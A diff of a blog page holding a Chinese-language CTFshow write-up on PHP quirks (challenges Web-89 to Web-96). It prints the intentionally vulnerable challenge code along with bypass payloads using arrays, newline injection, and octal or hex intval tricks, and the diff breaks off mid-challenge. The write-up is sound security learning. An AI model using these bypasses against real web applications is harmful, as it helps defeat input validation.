@@ -1,408 +1,291 @@
+
+
 <!DOCTYPE html>
-<html lang="en-US">
-  <head>
+<html lang="en-US" data-default-color-scheme=auto>
+
+
+
+<head>
   <meta charset="UTF-8">
-  <meta 
-    name="viewport"
-    content="width=device-width, initial-scale=1.0, minimum-scale=1.0">
-  <meta 
-    http-equiv="X-UA-Compatible" 
-    content="ie=edge">
-  <meta 
-    name="theme-color" 
-    content="#fff" 
-    id="theme-color">
-  <meta 
-    name="description" 
-    content="4CH4N ZKUAN">
-  <link 
-    rel="icon" 
-    href="/images/logo.png">
-  <title>PHP Security Features</title>
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/favicon.png">
+  <link rel="icon" href="/images/logo.png">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="zkuan">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="CTFshow:PHP特性学习">
+<meta property="og:type" content="article">
+<meta property="og:title" content="PHP Security Features">
+<meta property="og:url" content="https://whoiszkuan.github.io/2021/12/02/PHP-Security-Features/index.html">
+<meta property="og:site_name" content="4CH4N ZKUAN">
+<meta property="og:description" content="CTFshow:PHP特性学习">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://gitee.com/zku4n/picgo/raw/master/img/image-20211201191106865.png">
+<meta property="og:image" content="https://gitee.com/zku4n/picgo/raw/master/img/image-20211201191243482.png">
+<meta property="og:image" content="https://gitee.com/zku4n/picgo/raw/master/img/image-20211202105809062.png">
+<meta property="og:image" content="https://gitee.com/zku4n/picgo/raw/master/img/image-20211202105318433.png">
+<meta property="article:published_time" content="2021-12-02T13:11:17.000Z">
+<meta property="article:modified_time" content="2021-12-21T03:28:23.233Z">
+<meta property="article:author" content="zkuan">
+<meta property="article:tag" content="Web">
+<meta property="article:tag" content="Security">
+<meta property="article:tag" content="PHP">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://gitee.com/zku4n/picgo/raw/master/img/image-20211201191106865.png">
+  
+  
+  <title>PHP Security Features - 4CH4N ZKUAN</title>
+
+  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4/dist/css/bootstrap.min.css" />
+
+
+  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/github-markdown-css@4/github-markdown.min.css" />
+  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/hint.css@2/hint.min.css" />
+
   
     
-      <meta 
-        property="og:title" 
-        content="PHP Security Features">
     
-    
-      <meta 
-        property="og:url" 
-        content="https://whoiszkuan.github.io/2021/12/02/PHP-Security-Features/index.html">
-    
-    
-      <meta 
-        property="og:img" 
-        content="/images/zkuan.png">
-    
-    
-      <meta 
-        property="og:img" 
-        content="CTFshow:PHP特性学习">
-    
-    
-      <meta 
-        property="og:type" 
-        content="article">
-      <meta 
-        property="og:article:published_time" 
-        content="2021-12-02">
-      <meta 
-        property="og:article:modified_time" 
-        content="2021-12-10">
-      <meta 
-        property="og:article:author" 
-        content="0x95cn_zkuan">
+      
       
         
-          <meta 
-            property="og:article:tag" 
-            content="Web">
+          
+          
+          
         
-          <meta 
-            property="og:article:tag" 
-            content="Security">
-        
-          <meta 
-            property="og:article:tag" 
-            content="PHP">
-        
+        <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/prismjs@1/themes/prism-okaidia.min.css" />
+      
+      
+        <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/prismjs@1/plugins/line-numbers/prism-line-numbers.min.css" />
       
     
   
-  <script>
-    function loadScript(url, cb) {
-      var script = document.createElement('script');
-      script.src = url;
-      if (cb) script.onload = cb;
-      script.async = true;
-      document.body.appendChild(script);
-    }
-    function loadCSS(href, data, attr) {
-      var sheet = document.createElement('link');
-      sheet.ref = 'stylesheet';
-      sheet.href = href;
-      sheet.dataset[data] = attr;
-      document.head.appendChild(sheet);
-    }
-    function changeCSS(cssFile, data, attr) {
-      var oldlink = document.querySelector(data);
-      var newlink = document.createElement("link");
-      newlink.setAttribute("rel", "stylesheet");
-      newlink.setAttribute("href", cssFile);
-      newlink.dataset.prism = attr;
-      document.head.replaceChild(newlink, oldlink);
-    }
+
+  
+    <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3/dist/jquery.fancybox.min.css" />
+  
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_ba1fz6golrf.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+<!-- 自定义样式保持在最底部 -->
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    var CONFIG = {"hostname":"whoiszkuan.github.io","root":"/","version":"1.8.14","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"right","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"copy_btn":true,"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"baidu":null,"google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false}},"search_path":"/local-search.xml"};
   </script>
-  
-    
-      
-      
-      
-      
-        
-        
-        
-        <script>
-          function prismThemeChange() {
-            if(document.getElementById('theme-color').dataset.mode === 'dark') {
-              if(document.querySelector('[data-prism]')) {
-                changeCSS('/js/lib/prism/prism-twilight.min.css', '[data-prism]', 'prism-twilight');
-              } else {
-                loadCSS('/js/lib/prism/prism-twilight.min.css', 'prism', 'prism-twilight');
-              }
-            } else {
-              if(document.querySelector('[data-prism]')) {
-                changeCSS('/js/lib/prism/prism-twilight.min.css', '[data-prism]', 'prism-twilight');
-              } else {
-                loadCSS('/js/lib/prism/prism-twilight.min.css', 'prism', 'prism-twilight');
-              }
-            }
-          }
-          prismThemeChange()
-        </script>
-      
-      
-        
-        <link rel="stylesheet" href="/js/lib/prism/prism-line-numbers.min.css">
-      
-    
-  
-  <script>
-    // control reverse button
-    var reverseDarkList = {
-      dark: 'light',
-      light: 'dark'
-    };
-    var themeColor = {
-      dark: '#1c1c1e',
-      light: '#fff'
-    }
-    // get the data of css prefers-color-scheme
-    var getCssMediaQuery = function() {
-      return window.matchMedia('(prefers-color-scheme: dark)').matches ? 'dark' : 'light';
-    };
-    // reverse current darkmode setting function
-    var reverseDarkModeSetting = function() {
-      var setting = localStorage.getItem('user-color-scheme');
-      if(reverseDarkList[setting]) {
-        setting = reverseDarkList[setting];
-      } else if(setting === null) {
-        setting = reverseDarkList[getCssMediaQuery()];
-      } else {
-        return;
-      }
-      localStorage.setItem('user-color-scheme', setting);
-      return setting;
-    };
-    // apply current darkmode setting
-  </script>
-  
-    <script>
-      var setDarkmode = function(mode) {
-      var setting = mode || localStorage.getItem('user-color-scheme');
-      if(setting === getCssMediaQuery()) {
-        document.documentElement.removeAttribute('data-user-color-scheme');
-        localStorage.removeItem('user-color-scheme');
-        document.getElementById('theme-color').content = themeColor[setting];
-        document.getElementById('theme-color').dataset.mode = setting;
-        prismThemeChange();
-      } else if(reverseDarkList[setting]) {
-        document.documentElement.setAttribute('data-user-color-scheme', setting);
-        document.getElementById('theme-color').content = themeColor[setting];
-        document.getElementById('theme-color').dataset.mode = setting;
-        prismThemeChange();
-      } else {
-        document.documentElement.removeAttribute('data-user-color-scheme');
-        localStorage.removeItem('user-color-scheme');
-        document.getElementById('theme-color').content = themeColor[getCssMediaQuery()];
-        document.getElementById('theme-color').dataset.mode = getCssMediaQuery();
-        prismThemeChange();
-      }
-    };
-    setDarkmode();
-    </script>
-  
-  
-  <link rel="preload" href="//at.alicdn.com/t/font_1946621_i1kgafibvw.css" as="style" >
-  <link rel="preload" href="//at.alicdn.com/t/font_1952792_89b4ac4k4up.css" as="style" >
-  
-  
-    <link rel="preload" href="/js/lib/lightbox/baguetteBox.min.js" as="script">
-    <link rel="preload" href="/js/lib/lightbox/baguetteBox.min.css" as="style" >
-  
-  
-    <link rel="preload" href="/js/lib/lozad.min.js" as="script">
-  
-  
-  
-  
-  
-  
-  
-  <link rel="stylesheet" href="/css/main.css">
-  
-  <link rel="stylesheet" href="//at.alicdn.com/t/font_1946621_i1kgafibvw.css">
-  
-  <link rel="stylesheet" href="//at.alicdn.com/t/font_1952792_89b4ac4k4up.css">
-  
-    <link rel="stylesheet" href="/js/lib/lightbox/baguetteBox.min.css">
-  
-<meta name="generator" content="Hexo 5.4.0">
-<style>.github-emoji { position: relative; display: inline-block; width: 1.2em; min-height: 1.2em; overflow: hidden; vertical-align: top; color: transparent; }  .github-emoji > span { position: relative; z-index: 10; }  .github-emoji img, .github-emoji .fancybox { margin: 0 !important; padding: 0 !important; border: none !important; outline: none !important; text-decoration: none !important; user-select: none !important; cursor: auto !important; }  .github-emoji img { height: 1.2em !important; width: 1.2em !important; position: absolute !important; left: 50% !important; top: 50% !important; transform: translate(-50%, -50%) !important; user-select: none !important; cursor: auto !important; } .github-emoji-fallback { color: inherit; } .github-emoji-fallback img { opacity: 0 !important; }</style>
-<link rel="alternate" href="/atom.xml" title="4CH4N ZKUAN" type="application/atom+xml">
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+<meta name="generator" content="Hexo 5.4.0"><link rel="alternate" href="/atom.xml" title="4CH4N ZKUAN" type="application/atom+xml">
 </head>
 
-  <body>
-    <div class="wrapper">
-       
-      <nav class="navbar">
-  <div class="navbar-logo">
-    <span class="navbar-logo-main">
-      
-        <img 
-          class="navbar-logo-img"
-          width="32"
-          height="32"
-          src="/images/logo.png" 
-          alt="blog logo">
-      
-      <span class="navbar-logo-dsc">0x95cn</span>
-    </span>
-  </div>
-  <div class="navbar-menu">
-    
-      <a 
-        href="/" 
-        class="navbar-menu-item">
-        
-          Home
-        
-      </a>
-    
-      <a 
-        href="/archives" 
-        class="navbar-menu-item">
-        
-          Archive
-        
-      </a>
-    
-      <a 
-        href="/tags" 
-        class="navbar-menu-item">
-        
-          Tags
-        
-      </a>
-    
-      <a 
-        href="/categories" 
-        class="navbar-menu-item">
-        
-          Categories
-        
-      </a>
-    
-      <a 
-        href="/about" 
-        class="navbar-menu-item">
-        
-          About
-        
-      </a>
-    
-    <a 
-      class="navbar-menu-item darknavbar" 
-      id="dark">
-      <i class="iconfont icon-weather"></i>
+
+<body>
+  <header style="height: 70vh;">
+    <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>0x95cn</strong>
     </a>
-    <a 
-      class="navbar-menu-item searchnavbar" 
-      id="search">
-      <i 
-        class="iconfont icon-search" 
-        style="font-size: 1.2rem; font-weight: 400;">
-      </i>
-    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/">
+                <i class="iconfont icon-home-fill"></i>
+                Startseite
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/">
+                <i class="iconfont icon-archive-fill"></i>
+                Archiv
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/">
+                <i class="iconfont icon-category-fill"></i>
+                Kategorie
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/">
+                <i class="iconfont icon-tags-fill"></i>
+                Etiketten
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/">
+                <i class="iconfont icon-user-fill"></i>
+                Über mich
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              &nbsp;<i class="iconfont icon-search"></i>&nbsp;
+            </a>
+          </li>
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">&nbsp;<i
+                class="iconfont icon-dark" id="color-toggle-icon"></i>&nbsp;</a>
+          </li>
+        
+      </ul>
+    </div>
   </div>
-</nav> 
-      
-      <div 
-        id="local-search" 
-        style="display: none">
-        <input
-          class="navbar-menu-item"
-          id="search-input"
-          placeholder="请输入搜索内容..." />
-        <div id="search-content"></div>
-      </div>
-      
-      <div class="section-wrap">
-        <div class="container">
-          <div class="columns">
-            <main class="main-column">
-<article class="card card-content">
-  <header>
-    <h1 class="post-title">
-      PHP Security Features
-    </h1>
-  </header>
-  <div class="post-meta post-show-meta">
-    <time datetime="2021-12-02T13:11:17.000Z">
-      <i 
-        class="iconfont icon-calendar" 
-        style="margin-right: 2px;">
-      </i>
-      <span>2021-12-02</span>
-    </time>
-    
-      <span class="dot"></span>
-      
-        <a 
-          href="/categories/WebSec/" 
-          class="post-meta-link">
-          WebSec
-        </a>
-      
-    
-    
-      <span class="dot"></span>
-      <span>3.8k words</span>
-    
-  </div>
+</nav>
+
+    <div class="banner" id="banner" parallax=true
+         style="background: url('/images/banner1.png') no-repeat center center;
+           background-size: cover;">
+      <div class="full-bg-img">
+        <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+          <div class="page-header text-center fade-in-up">
+            <span class="h2" id="subtitle" title="PHP Security Features">
+              
+            </span>
+
+            
+              <div class="mt-3">
   
-    <div 
-      class="post-meta post-show-meta" 
-      style="margin-top: -10px;">
-      <div style="display: flex; align-items: center;">
-        <i 
-          class="iconfont icon-biaoqian" 
-          style="margin-right: 2px; font-size: 1.15rem;">
-        </i>
-        
+  
+    <span class="post-meta">
+      <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+      <time datetime="2021-12-02 21:11" pubdate>
+        December 2, 2021 pm
+      </time>
+    </span>
+  
+</div>
+
+<div class="mt-1">
+  
+    <span class="post-meta mr-2">
+      <i class="iconfont icon-chart"></i>
+      18k 字
+    </span>
+  
+
+  
+    <span class="post-meta mr-2">
+      <i class="iconfont icon-clock-fill"></i>
+      
+      
+      151 分钟
+    </span>
+  
+
+  
+  
+</div>
+
+            
+          </div>
+
           
-          <a 
-            href="/tags/Web/" 
-            class="post-meta-link">
-            Web
-          </a>
-        
-          
-            <span class="dot"></span>
-          
-          <a 
-            href="/tags/Security/" 
-            class="post-meta-link">
-            Security
-          </a>
-        
-          
-            <span class="dot"></span>
-          
-          <a 
-            href="/tags/PHP/" 
-            class="post-meta-link">
-            PHP
-          </a>
-        
+        </div>
       </div>
     </div>
-  
   </header>
-  <div 
-    id="section" 
-    class="post-content">
-    <h1 id="Web-89-数组绕过"><a href="#Web-89-数组绕过" class="headerlink" title="Web-89 数组绕过"></a>Web-89 数组绕过</h1><pre class="line-numbers language-php" data-language="php"><code class="language-php">include("flag.php");
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="d-none d-lg-block col-lg-2"></div>
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div class="py-5" id="board">
+          <article class="post-content mx-auto">
+            <!-- SEO header -->
+            <h1 style="display: none">PHP Security Features</h1>
+            
+            <div class="markdown-body">
+              <h1 id="Web-89-数组绕过"><a href="#Web-89-数组绕过" class="headerlink" title="Web-89 数组绕过"></a>Web-89 数组绕过</h1><div class="code-wrapper"><pre class="line-numbers language-php" data-language="php"><code class="language-php">include(&quot;flag.php&quot;);
 highlight_file(__FILE__);
 
-if(isset($_GET['num'])){
-    $num = $_GET['num'];
-    if(preg_match("/[0-9]/", $num)){
-        die("no no no!");
-    }
-    if(intval($num)){
+if(isset($_GET[&#39;num&#39;]))&#123;
+    $num &#x3D; $_GET[&#39;num&#39;];
+    if(preg_match(&quot;&#x2F;[0-9]&#x2F;&quot;, $num))&#123;
+        die(&quot;no no no!&quot;);
+    &#125;
+    if(intval($num))&#123;
         echo $flag;
-    }
-}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+    &#125;
+&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></div>
 
 <p><code>preg_match</code>正则匹配<code>0-9</code>通过数组绕过</p>
 <ul>
 <li>payload：<code>?num[]=</code></li>
 </ul>
-<h1 id="Web-90-intval"><a href="#Web-90-intval" class="headerlink" title="Web-90 intval"></a>Web-90 intval</h1><pre class="line-numbers language-php" data-language="php"><code class="language-php">include("flag.php");
+<h1 id="Web-90-intval"><a href="#Web-90-intval" class="headerlink" title="Web-90 intval"></a>Web-90 intval</h1><div class="code-wrapper"><pre class="line-numbers language-php" data-language="php"><code class="language-php">include(&quot;flag.php&quot;);
 highlight_file(__FILE__);
-if(isset($_GET['num'])){
-    $num = $_GET['num'];
-    if($num==="4476"){
-        die("no no no!");
-    }
-    if(intval($num,0)===4476){
+if(isset($_GET[&#39;num&#39;]))&#123;
+    $num &#x3D; $_GET[&#39;num&#39;];
+    if($num&#x3D;&#x3D;&#x3D;&quot;4476&quot;)&#123;
+        die(&quot;no no no!&quot;);
+    &#125;
+    if(intval($num,0)&#x3D;&#x3D;&#x3D;4476)&#123;
         echo $flag;
-    }else{
+    &#125;else&#123;
         echo intval($num,0);
-    }
-}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+    &#125;
+&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></div>
 
 <h2 id="intval函数说明"><a href="#intval函数说明" class="headerlink" title="intval函数说明"></a>intval函数说明</h2><p>intval-获取变量的整数值</p>
 <p><code>intval (mixed $var [,int $base=10]) : int</code></p>
@@ -428,20 +311,20 @@ if(isset($_GET['num'])){
 <p><code>?num=0x117c</code></p>
 <p>or</p>
 <p><code>?numb=4476a</code></p>
-<h1 id="Web-91-0a绕过"><a href="#Web-91-0a绕过" class="headerlink" title="Web-91 %0a绕过"></a>Web-91 %0a绕过</h1><pre class="line-numbers language-php" data-language="php"><code class="language-php">show_source(__FILE__);
-include('flag.php');
-$a=$_GET['cmd'];
-if(preg_match('/^php$/im', $a)){
-    if(preg_match('/^php$/i', $a)){
-        echo 'hacker';
-    }
-    else{
+<h1 id="Web-91-0a绕过"><a href="#Web-91-0a绕过" class="headerlink" title="Web-91 %0a绕过"></a>Web-91 %0a绕过</h1><div class="code-wrapper"><pre class="line-numbers language-php" data-language="php"><code class="language-php">show_source(__FILE__);
+include(&#39;flag.php&#39;);
+$a&#x3D;$_GET[&#39;cmd&#39;];
+if(preg_match(&#39;&#x2F;^php$&#x2F;im&#39;, $a))&#123;
+    if(preg_match(&#39;&#x2F;^php$&#x2F;i&#39;, $a))&#123;
+        echo &#39;hacker&#39;;
+    &#125;
+    else&#123;
         echo $flag;
-    }
-}
-else{
-    echo 'nonononono';
-}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+    &#125;
+&#125;
+else&#123;
+    echo &#39;nonononono&#39;;
+&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></div>
 
 <table>
 <thead>
@@ -471,56 +354,56 @@ else{
 <p>第二个<code>if</code>：区分大小写但只匹配单行，如果第一行不存在php则打印出flag。</p>
 <p>综上所述：可使用换行符+字符串php，同时满足两个判断的条件，当第一个判断时，换行符+php为两行既多行，且能匹配到字符串php。进入第二个判断，第一行为换行符，即第一行为空不为php，所以输出flag</p>
 <p><code>payload</code>:<code>?cmd=%0aphp</code></p>
-<h1 id="Web-92-intval-八进制十六进制绕过"><a href="#Web-92-intval-八进制十六进制绕过" class="headerlink" title="Web-92 intval 八进制十六进制绕过"></a>Web-92 intval 八进制十六进制绕过</h1><pre class="line-numbers language-php" data-language="php"><code class="language-php">include("flag.php");
+<h1 id="Web-92-intval-八进制十六进制绕过"><a href="#Web-92-intval-八进制十六进制绕过" class="headerlink" title="Web-92 intval 八进制十六进制绕过"></a>Web-92 intval 八进制十六进制绕过</h1><div class="code-wrapper"><pre class="line-numbers language-php" data-language="php"><code class="language-php">include(&quot;flag.php&quot;);
 highlight_file(__FILE__);
-if(isset($_GET['num'])){
-    $num = $_GET['num'];
-    if($num==4476){
-        die("no no no!");
-    }
-    if(intval($num,0)==4476){
+if(isset($_GET[&#39;num&#39;]))&#123;
+    $num &#x3D; $_GET[&#39;num&#39;];
+    if($num&#x3D;&#x3D;4476)&#123;
+        die(&quot;no no no!&quot;);
+    &#125;
+    if(intval($num,0)&#x3D;&#x3D;4476)&#123;
         echo $flag;
-    }else{
+    &#125;else&#123;
         echo intval($num,0);
-    }
-}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+    &#125;
+&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></div>
 
 <p>intval函数，可使用八进制(010574)或十六进制(0x117c)绕过</p>
-<h1 id="Web-93-intval-八进制绕过"><a href="#Web-93-intval-八进制绕过" class="headerlink" title="Web-93 intval 八进制绕过"></a>Web-93 intval 八进制绕过</h1><pre class="line-numbers language-php" data-language="php"><code class="language-php">include("flag.php");
+<h1 id="Web-93-intval-八进制绕过"><a href="#Web-93-intval-八进制绕过" class="headerlink" title="Web-93 intval 八进制绕过"></a>Web-93 intval 八进制绕过</h1><div class="code-wrapper"><pre class="line-numbers language-php" data-language="php"><code class="language-php">include(&quot;flag.php&quot;);
 highlight_file(__FILE__);
-if(isset($_GET['num'])){
-    $num = $_GET['num'];
-    if($num==4476){
-        die("no no no!");
-    }
-    if(preg_match("/[a-z]/i", $num)){
-        die("no no no!");
-    }
-    if(intval($num,0)==4476){
+if(isset($_GET[&#39;num&#39;]))&#123;
+    $num &#x3D; $_GET[&#39;num&#39;];
+    if($num&#x3D;&#x3D;4476)&#123;
+        die(&quot;no no no!&quot;);
+    &#125;
+    if(preg_match(&quot;&#x2F;[a-z]&#x2F;i&quot;, $num))&#123;
+        die(&quot;no no no!&quot;);
+    &#125;
+    if(intval($num,0)&#x3D;&#x3D;4476)&#123;
         echo $flag;
-    }else{
+    &#125;else&#123;
         echo intval($num,0);
-    }
-}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+    &#125;
+&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></div>
 
 <p>正则表达式过滤了<code>[a-z]</code>字母，可使用intval八进制(010574)绕过</p>
-<h1 id="Web-94-intval-小数点绕过"><a href="#Web-94-intval-小数点绕过" class="headerlink" title="Web-94 intval 小数点绕过"></a>Web-94 intval 小数点绕过</h1><pre class="line-numbers language-php" data-language="php"><code class="language-php">include("flag.php");
+<h1 id="Web-94-intval-小数点绕过"><a href="#Web-94-intval-小数点绕过" class="headerlink" title="Web-94 intval 小数点绕过"></a>Web-94 intval 小数点绕过</h1><div class="code-wrapper"><pre class="line-numbers language-php" data-language="php"><code class="language-php">include(&quot;flag.php&quot;);
 highlight_file(__FILE__);
-if(isset($_GET['num'])){
-    $num = $_GET['num'];
-    if($num==="4476"){
-        die("no no no!");
-    }
-    if(preg_match("/[a-z]/i", $num)){
-        die("no no no!");
-    }
-    if(!strpos($num, "0")){
-        die("no no no!");
-    }
-    if(intval($num,0)===4476){
+if(isset($_GET[&#39;num&#39;]))&#123;
+    $num &#x3D; $_GET[&#39;num&#39;];
+    if($num&#x3D;&#x3D;&#x3D;&quot;4476&quot;)&#123;
+        die(&quot;no no no!&quot;);
+    &#125;
+    if(preg_match(&quot;&#x2F;[a-z]&#x2F;i&quot;, $num))&#123;
+        die(&quot;no no no!&quot;);
+    &#125;
+    if(!strpos($num, &quot;0&quot;))&#123;
+        die(&quot;no no no!&quot;);
+    &#125;
+    if(intval($num,0)&#x3D;&#x3D;&#x3D;4476)&#123;
         echo $flag;
-    }
-}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+    &#125;
+&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></div>
 
 <p>比较上一关出现了strpos()函数，函数说明</p>
 <ul>
@@ -528,73 +411,73 @@ if(isset($_GET['num'])){
 <li>对大小写敏感</li>
 <li>返回字符串在另一字符串中第一次出现的位置，如果没有字符串则返回FALSE。</li>
 </ul>
-<p><code>!strpos($num, "0")</code>限制了传参时第一位不能为0，如果第一位为0，则die，在字符串中找不到0，也会die。</p>
+<p><code>!strpos($num, &quot;0&quot;)</code>限制了传参时第一位不能为0，如果第一位为0，则die，在字符串中找不到0，也会die。</p>
 <p>payload可为：</p>
 <p>空格+八进制：<code> 010574</code></p>
 <p>小数点+0：<code>4476.0</code></p>
 <p>头部加号+尾部小数点：<code>+4476.0</code></p>
-<h1 id="Web-95-intval-空格绕过"><a href="#Web-95-intval-空格绕过" class="headerlink" title="Web-95 intval 空格绕过"></a>Web-95 intval 空格绕过</h1><pre class="line-numbers language-php" data-language="php"><code class="language-php">include("flag.php");
+<h1 id="Web-95-intval-空格绕过"><a href="#Web-95-intval-空格绕过" class="headerlink" title="Web-95 intval 空格绕过"></a>Web-95 intval 空格绕过</h1><div class="code-wrapper"><pre class="line-numbers language-php" data-language="php"><code class="language-php">include(&quot;flag.php&quot;);
 highlight_file(__FILE__);
-if(isset($_GET['num'])){
-    $num = $_GET['num'];
-    if($num==4476){
-        die("no no no!");
-    }
-    if(preg_match("/[a-z]|\./i", $num)){
-        die("no no no!!");
-    }
-    if(!strpos($num, "0")){
-        die("no no no!!!");
-    }
-    if(intval($num,0)===4476){
+if(isset($_GET[&#39;num&#39;]))&#123;
+    $num &#x3D; $_GET[&#39;num&#39;];
+    if($num&#x3D;&#x3D;4476)&#123;
+        die(&quot;no no no!&quot;);
+    &#125;
+    if(preg_match(&quot;&#x2F;[a-z]|\.&#x2F;i&quot;, $num))&#123;
+        die(&quot;no no no!!&quot;);
+    &#125;
+    if(!strpos($num, &quot;0&quot;))&#123;
+        die(&quot;no no no!!!&quot;);
+    &#125;
+    if(intval($num,0)&#x3D;&#x3D;&#x3D;4476)&#123;
         echo $flag;
-    }
-}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+    &#125;
+&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></div>
 
 <p>过滤了小数点，可用<code>空格+八进制绕过</code>：<code> 010574</code></p>
 <p>也可用<code>URL编码+八进制绕过</code>：<code>%20010574</code>or<code>%0a010574</code></p>
-<h1 id="Web-96-绝对路径，相对路径"><a href="#Web-96-绝对路径，相对路径" class="headerlink" title="Web-96 绝对路径，相对路径"></a>Web-96 绝对路径，相对路径</h1><pre class="line-numbers language-php" data-language="php"><code class="language-php">highlight_file(__FILE__);
+<h1 id="Web-96-绝对路径，相对路径"><a href="#Web-96-绝对路径，相对路径" class="headerlink" title="Web-96 绝对路径，相对路径"></a>Web-96 绝对路径，相对路径</h1><div class="code-wrapper"><pre class="line-numbers language-php" data-language="php"><code class="language-php">highlight_file(__FILE__);
 
-if(isset($_GET['u'])){
-    if($_GET['u']=='flag.php'){
-        die("no no no");
-    }else{
-        highlight_file($_GET['u']);
-    }
-}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+if(isset($_GET[&#39;u&#39;]))&#123;
+    if($_GET[&#39;u&#39;]&#x3D;&#x3D;&#39;flag.php&#39;)&#123;
+        die(&quot;no no no&quot;);
+    &#125;else&#123;
